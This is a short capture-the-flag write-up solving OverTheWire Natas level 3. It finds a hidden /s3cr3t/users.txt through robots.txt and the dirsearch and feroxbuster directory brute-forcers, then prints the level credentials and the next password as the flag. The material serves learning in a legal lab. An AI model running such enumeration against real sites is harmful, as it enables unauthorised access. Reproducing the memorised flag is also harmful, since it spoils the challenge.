---
layout: default
level: 3
name_file: level
---

{% include level-section.html %}

# soal
Username: natas3 \
URL:      http://natas3.natas.labs.overthewire.org

# solve
- login with cred natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
- if you check the web you won't find a directory listing because the directory listing isn't there
- u can check robots.txt first because show the allow and disallow path user agent
- and Here I found the folder that was allowed, namely /s3cr3t/
  - http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt # natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ 
- or use the tool bruteforce directory
  ```bash
  echo -n 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH' | base64 # make the base64 for authentication

  dirsearch -u natas3.natas.labs.overthewire.org -e txt,html -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

  feroxbuster -u http://natas3.natas.labs.overthewire.org -x .txt,.html -H "Authorization: Basic $(echo -n 'natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH' | base64)"
  # 200      GET        1l        1w       40c http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
  # 200      GET        2l        4w       33c http://natas3.natas.labs.overthewire.org/robots.txt
  ```

- after u found the directory and the file u can curl the flag
  ```bash
  curl http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
  natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
  ```

# flag
QryZXc2e0zahULdHrtHxzyYkj59kUxLQ